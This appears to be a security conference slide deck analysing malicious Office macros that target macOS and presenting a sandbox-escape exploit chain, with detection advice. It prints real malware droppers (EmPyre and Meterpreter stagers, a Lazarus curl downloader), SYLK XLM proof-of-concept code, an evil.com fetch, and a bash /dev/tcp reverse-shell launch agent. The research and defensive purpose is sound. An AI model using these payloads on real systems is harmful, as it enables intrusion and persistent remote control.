Office Drama
...on macOS

WHOIS

@patrickwardle

OUTLINE
history

Evil Office Docs!
analysis

exploit chain

defense

Recent History macro based attacks, targeting macOS

MACROS
...defined

tl;dr: add code to documents

Macro: "A macro is a series of commands & instructions that you group together as a single command to accomplish a task automatically" -Microsoft

+
MSOffice document + code

01 Sub AutoOpen()

02

MsgBox "Hello World!", 0, "Title"

03 End Sub

macro code (VBScript)

MACROS
...of course (ab)used by attackers
+
though mitigations...

MACROS
now on macOS?

more macs...

malicious & potentially unwanted files for macOS (Kasperksy)
more mac malware...

2017
macro attack

"U.S. Allies and Rivals Digest Trump's Victory - Carnegie Endowment for International Peace.docm"

discovery & (limited) detection
"New Attack, Old Tricks" objective-see.com/blog/blog_0x17.html

2018
macro attack

"BitcoinMagazineQuidax_InterviewQuestions_2018.docm"
sandbox escape!

discovery & (limited) detection

download & exec 2nd-stage (python) payload

"Word to Your Mac" objective-see.com/blog/blog_0x3A.html

2019
macro attack

"_(.doc"
is mac?

infected document (credit: kaspersky)

download & exec 2nd-stage (mach-O) payload

"Cryptocurrency businesses still being targeted by Lazarus" securelist.com/cryptocurrency-businesses-still-being-targeted-by-lazarus

Analysis understanding macro based attacks

EXTRACTING EMBEDDED MARCOS
oletools, ftw

$ sudo pip install -U oletools $ olevba -c <path/to/document>

github.com/decalage2/oletools

installation/usage

$ olevba -c ~/Documents/HelloWorld.docm olevba 0.55.1 on Python 3.7.3 - http://decalage.info/python/oletools ===================================================================== FILE: /Users/patrick/Documents/HelloWorld.docm Type: OpenXML --------------------------------------------------------------------VBA MACRO ThisDocument.cls in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument' - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Sub AutoOpen() MsgBox "Hello World!", 0, "Title"
End Sub
macro extraction

AutoOpen()
"(automatically) runs after you open a new document"

"Description of behaviors of AutoExec & AutoOpen macros"
support.microsoft.com/en-us/help/286310/description-of-behaviors-of-autoexec-and-autoopen-macros-in-word

ANALYSIS:
"U.S. Allies & Rivals Digest Trump's Victory"
via ' ' autoopen

$ olevba -c "U.S. Allies and Rivals Digest Trump's Victory.docm"
VBA MACRO ThisDocument.cls in file: word/vbaProject.bin - --------------------------------

'Fisher' subroutine: automatically executed

Sub autoopen() Fisher End Sub
Public Sub Fisher()
Dim result As Long Dim cmd As String cmd = "ZFhGcHJ2c2dNQlNJeVBmPSdhdGZNelpPcVZMYmNqJwppbXBvcnQgc3" cmd = cmd + "NsOwppZiBoYXNhdHRyKHNzbCwgJ19jcmVhdGVfdW52ZXJpZm" ... result = system("echo ""import sys,base64;exec(base64.b64decode( \"" " & cmd & " \""));"" | python &")
End Sub

Sub 'Fisher()': concat base64-encoded str.
decode & exec via python

Fisher() embedded macros

ANALYSIS:
"U.S. Allies & Rivals Digest
$ python >>> import base64 >>> cmd = "ZFhGcHJ2c2dNQlNJeVBmPSdhdGZNelpPcVZMYmNqJwppbXBv .... " >>> base64.b64decode(cmd) ... dXFprvsgMBSIyPf = 'atfMzZOqVLbcj' import ssl; import sys, urllib2; import re, subprocess; cmd = "ps -ef | grep Little\ Snitch | grep -v grep" ps = subprocess.Popen(cmd, shell = True, stdout = subprocess.PIPE) out = ps.stdout.read() ps.stdout.close() if re.search("Little Snitch", out):
sys.exit() ... a = o.open('https://www.securitychecking.org:443/index.asp').read(); key = 'fff96aed07cb7ea65e7f031bd714607d'; S, j, out = range(256), 0, [] for i in range(256):
j = (j + S[i] + ord(key[i % len(key)])) % 256 S[i], S[j] = S[j], S[i] ...

Trump's Victory" firewall check
LittleSnitch running?
Download 2nd-stage payload (www.securitychecking.org)
RC4 decrypt this payload (key: fff96aed07cb7ea...) Execute decrypted payload

exec(''.join(out))

decoded python code ...looks familiar!?

EmPyre (python backdoor)

ANALYSIS:
"BitcoinMagazine-Quidax_InterviewQuestions_2018"

$ olevba -c "BitcoinMagazine-Quidax_InterviewQuestions_2018.docm"
Private Sub Document_Open()
payload = "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ" & "...6c30pCg==')));"
path = Environ("HOME") & "/../../../../Library/LaunchAgents/~$com.xpnsec.plist"
arg = "<?xml version=""1.0"" encoding=""UTF-8""?>\n" & _ "<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ...">\n" & _ "<plist version=""1.0"">\n" & _ "<dict>\n" & _ "<key>Label</key>\n" & _ "<string>com.xpnsec.sandbox</string>\n" & _ "<key>ProgramArguments</key>\n" & _ "<array>\n" & _ "<string>python</string>\n" & _ "<string>-c</string>\n" & _ "<string>" & payload & "</string>" & _ "</array>\n" & _ "<key>RunAtLoad</key>\n" & _ "<true/>\n" & _ "</dict>\n" & _ "</plist>" Result = system("echo """ & arg & """ > '" & path & "'", "r") 'Result = system("launchctl bootout gui/$UID", "r")
End Sub

'Document_Open()': triggers automatic execution decode & exec via python
create ~$com.xpnsec.plist

ANALYSIS:
"BitcoinMagazine-Quidax_InterviewQuestions_2018"

$ python >>> import base64 >>> payload = "aW1wb3J0IHNvY2tldCxzdHJ1Y3Qs3IgeCBpbiByYW5n...30pCg==" >>> base64.b64decode(payload)
"import socket,struct,time\nfor x in range(10):\n\ttry: \n\t\ts=socket.socket(2,socket.SOCK_STREAM) \n\t\ts.connect(('109.202.107.20',9622))\n\t\tbreak\n\texcept: \n\t\ttime.sleep(5)\nl=struct.unpack('>I',s.recv(4))[0]\nd=s.recv(l) \nwhile len(d)<l:\n\td+=s.recv(l-len(d))\nexec(d,{'s':s})\n"

109.202.107.20

01 import socket, struct, time

02 for x in range(10):

03 try:

04

s=socket.socket(2,socket.SOCK_STREAM)

05

s.connect(('109.202.107.20',9622))

06

break

07 except:

08

time.sleep(5)

09

10 l=struct.unpack('>I',s.recv(4))[0]

11 d=s.recv(l)

12 while len(d)<l:

13 d+=s.recv(l-len(d))

14

15 exec(d,{'s':s})

download & exec ...Meterpreter

ANALYSIS:
"BitcoinMagazine-Quidax_InterviewQuestions_2018"

path = Environ("HOME") & "/../../../../Library/LaunchAgents/~$com.xpnsec.plist"
arg = "<?xml version=""1.0"" ...>\n" & _ "<!DOCTYPE plist PUBLIC ...">\n" & _ "<plist version=""1.0"">\n" & _ "<key>Label</key>\n" & _ "<string>com.xpnsec.sandbox</string>\n" & _ ... "</plist>" Result = system("echo """ & arg & """ > '" & path & "'", "r")
embedded macro code ..."stolen"!?

Adam's PoC

$ codesign --display -v --entitlements - "Microsoft Word.app" ... com.apple.security.temporary-exception.sbpl (allow file-read* file-write*
(require-any (require-all (vnode-type REGULAR-FILE) (regex #"(^|/)~\$[^/]+$"))
) )

"....allows us to create a file anywhere on the filesystem as long as it ends with ~$something"
-(Adam Chester)
sandbox escape via

Word's Sandbox Profile

/Library/LaunchAgents/~$com.xpnsec.plist

"Escaping the Microsoft Office Sandbox" objective-see.com/blog/blog_0x35.html

ANALYSIS:
"_(.doc"

macOS-specific logic

$ olevba -c "_(.doc"
Sub AutoOpen() ... #If Mac Then
sur = "https://nzssdm.com/assets/mt.dat" ...
res = system("curl -o " & spath & " " & sur) res = system("chmod +x " & spath) res = popen(spath, "r")

'AutoOpen()': triggers automatic execution
nzssdm.com

embedded (macOS-specific) macros
download payload (via curl)
set executable (via chmod +x)
execute (via popen)

mt.dat (implant)

"Lazarus APT Targets Mac Users with Poisoned Word Document"
labs.sentinelone.com/lazarus-apt-targets-mac-users-poisoned-word-document/

Advanced Exploitation a '0-click' macro based attack

CURRENT ATTACKS
...rather lame (and dysfunctional?)
alert!
app sandbox
$ log stream Error kernel: (Quarantine) exec of /private/tmp/backdoor denied ...since it was quarantined by Microsoft Word and created without user consent
quarantine attribute + notarizations

AUTOMATIC MACRO EXECUTION
...with no alerts

only Office 2011, Microsoft: #wontfix

"In Office 2011 for Mac, XLM Macro's in Sylk files are auto executed (no protected mode or macro prompt)" -The MS Office Magic Show" (2018), Pieter Ceelen & Stan Hegt
no prompt!

Excel 2019

macro security

latest version of Office!

"The Microsoft Office (2016, 2019) for Mac option "Disable all macros without notification" enables XLM macros without prompting..."
-CERT, vulnerability note VU#125336 (11/2019)

XLM MACROS IN SYLK FILES
...ollld file format!

XLM:

macro language predating VBA Sylk (.slk) files

}

SYmbolic LinK, (1980s file format)

still supported!

01 ID;P

02 O;E

03 04

NN;NAuto_open;ER101C1;KOut Flank;F

05 C;X1;Y101;K0;ECALL("libc.dylib","system","JC","open -a Calculator")

06 C;X1;Y102;K0;EHALT()

07 E

PoC.slk: spawn calc (via XLM)

"Abusing the SYLK file format"
outflank.nl/blog/2019/10/30/abusing-the-sylk-file-format/

SANDBOX BYPASS
...macros are (now) sandboxed

spawning calc, is now, far from end-game

"In a sandboxed application, child processes created with the Process class inherit the sandbox of the parent app" -Apple

$ codesign --display -v --entitlements - "Microsoft Word.app" ... com.apple.security.temporary-exception.sbpl (allow file-read* file-write*
(require-any (require-all (vnode-type REGULAR-FILE) (regex #"(^|/)~\$[^/]+$"))
) )
Word's (Office) Sandbox Profile

"....allows us to create a file anywhere on the filesystem as long as it ends with ~$something"
-(Adam Chester)

<string> (deny file-write* (subpath (string-append (param "_HOME") "/Library/Application Scripts")) (subpath (string-append (param "_HOME") "/Library/LaunchAgents")))
</string>
...now patched

SANDBOX BYPASS

...download & execute; allowed

process monitor

escape?

# processMonitor {
"event" : "ES_EVENT_TYPE_NOTIFY_EXEC", "process" : {
"path" : "/usr/bin/curl", "arguments" : [ "curl",

sandbox allows: network comms script execution
sandboxed

"-L", "http://evil.com/escape.py", "-o", "/tmp/~$escape.py" ], } }, { "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
"process" : {
"path" : "/System/Library/.../2.7/bin/python2.7", "arguments" : [
"python", "/tmp/~$escape.py" ], }

}

curl / python...allowed!

SANDBOX BYPASS
via user login item

01 #create (CF)URL to app (e.g. Terminal.app)

02 appURL = CoreFoundation.CFURLCreateWithFileSystemPath(

03

kCFAllocatorDefault, path2App.get_ref(),

04

kCFURLPOSIXPathStyle, 1)

05 06

#get the list of (existing) login items items = CoreServices.LSSharedFileListCreate(

07

kCFAllocatorDefault,

08

kLSSharedFileListSessionLoginItems, None)

09

10 #add app to list of login items

11 CoreServices.LSSharedFileListInsertItemURL(

12

loginItems, kLSSharedFileListItemLast,

13

None, None, appURL, None, None)

~$escape.py

# TrueTree /System/Library/LaunchDaemons/com.apple.loginwindow.plist
/System/Library/CoreServices/loginwindow.app /System/Applications/Utilities/Terminal.app
loginwindow -> login items (TrueTree, J. Bradley)

un-sandboxed!

QUARANTINED / NOTARIZATION
...macros are (now) sandboxed
can't pass args to login items :( ...just persist our own (payload)?

01 NN;NAuto_open;ER101C1;KOut Flank;F 02 C;X1;Y102;K0;ECALL("libc.dylib","system","JC","touch /tmp/\~\$payload")

$ xattr ~\$payload com.apple.quarantine
$ xattr -p com.apple.quarantine /tmp/~\$payload 0086;5e4c4b7a;Microsoft Excel;
any created payload: com.apple.quarantine (can't $ xattr -rc in sandbox)

blocked :(

QUARANTINED / NOTARIZATION

...an idea
a launch agent:

avoids ` ` com.apple.quarantine

run apple binary

pass arguments!

01 <?xml version="1.0" encoding="UTF-8"?>

02 <plist version="1.0">

03 <dict>

04

<key>ProgramArguments</key>

05

<array>

06

<string>/bin/bash</string>

07

<string>-c</string>

08

<string>/bin/bash -i &gt;&amp; /dev/tcp/<attacker ip>/8080 0&gt;&amp;1</string>

09

</array>

10

...

reverse shell, via bash

sandbox rule

<string> (deny file-write*
(subpath (string-append (param "_HOME") "/Library/LaunchAgents"))) </string>

creating launch agents: disallowed!

QUARANTINED / NOTARIZATION
...an idea
sandbox escape ...apple only, with no args quarantine 'bypass' ...but can't create (from sandbox)
escape
create launch agent
...must find a way for an apple binary (with no arguments), to create a launch agent for us!

ARCHIVE UTILITY.APP
...an idea!
Q: what happens if we "persist" a .zip file !?

A: macOS invokes its default handler! (apple binary, outside the sandbox)

.zip login item!?

$ lsregister -dump ... rank: bundle: bindings:

Default Archive Utility public.zip-archive, .zip

Archive Utility.app

Archive Utility ~/Library/~$payload.zip

launch agent "created"
LaunchAgents/ foo.plist

FULL EXPLOIT CHAIN
"remotely" infecting macOS

user opens .slk file

downloads & "persists" ~$payload.zip

LaunchAgents/
on (next) login, "Archive Utility" invoked & unzips
...creating launch agent

on (next) login, launch agent runs ...reverse shell!

FULL EXPLOIT CHAIN
an "unsandboxed" reverse shell ...game over!

01 <plist version="1.0"> 02 <dict>

runs outside sandbox

03

<key>ProgramArguments</key>

04

<array>

05

<string>/bin/bash</string>

can download & unquarantine files!

06

<string>-c</string>

07

<string>/bin/bash -i &gt;&amp; /dev/tcp/<attacker ip>/8080 0&gt;&amp;1</string>

08

</array>

09

...

launch agent (reverse shell, via bash)

OSX.WindTail

final payload: (repurposed) OSX.WindTail

Defense protection against macro based attacks

FIXES & BUG REPORTS
...Microsoft & Apple
macro bug patched: CVE-2019-1457

full report to Apple patched: 10.15.3
"is a known issue ...on the Apple side" !?

DETECTION
process monitoring
# ./processMonitor {
"event" : "ES_EVENT_TYPE_NOTIFY_EXEC", ... "path" : "/Applications/Microsoft Excel.app", "pid" : 1406
} {
"event" : "ES_EVENT_TYPE_NOTIFY_EXEC", "process" : {
"path" : "/usr/bin/curl", "arguments" : [
"curl", "http://evil.com/escape.py", "-o", "/tmp/~$escape.py" ], "ppid" : 1406 } } { "event" : "ES_EVENT_TYPE_NOTIFY_EXEC", "process" : { "path" : "/System/Library/.../2.7/bin/python2.7", "arguments" : [ "python", "/tmp/~$escape.py" ],
"ppid" : 1406 } }
Excel (pid: 1406) spawning curl & python!?

curl python
suspicious children!

DETECTION
file monitoring (persistence)
# ./fileMonitor {
"event" : "ES_EVENT_TYPE_NOTIFY_WRITE", "file" : {
"destination" : "~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm", "path" : "/System/Library/CoreServices/backgroundtaskmanagementagent", } }
login item persistence (backgrounditems.btm)
non-app login item!?
suspicious persistence!
"Block Blocking Login Items" objective-see.com/blog/blog_0x31.html

GENERICALLY DETECTING MAC MALWARE
via JamfProtect (MonitorKit + Apple's game engine)

MonitorKit

...in the news

alert !
actions (alert, log, etc)

Apple's game (logic) engine

Conclusion

TAKE AWAYS
macro attacks ...targeting macOS users
defense in depth!
Ensure your macOS systems are protected by a behavior-based security tool!

MAHALO!

"Friends of Objective-See"

PATRICK.WARDLE@JAMF.COM

Airo

Guardian Mobile Firewall

SecureMac

SmugMug

iVerify

Digital Guardian

Sophos

Halo Privacy

Announcing:

"THE ART OF MAC MALWARE"
free (online) books

volume 0x1: Analysis

infection vectors

methods of persistence

author: p. wardle

analysis tools & techniques

visit:
https://taomm.org

Office Drama

@patrickwardle

IMAGES:

RESOURCES:

� WIRDOU.COM/ � GITHUB.COM/ARIS-T2

� 'Cryptocurrency Businesses Still Being Targeted by Lazarus' -Kaspersky � 'Abusing the SYLK File Format' -Pieter Ceelen & Stan Hegt Pitts � 'Lazarus APT Targets Mac Users With Poisoned Word Document' -Phil Stokes

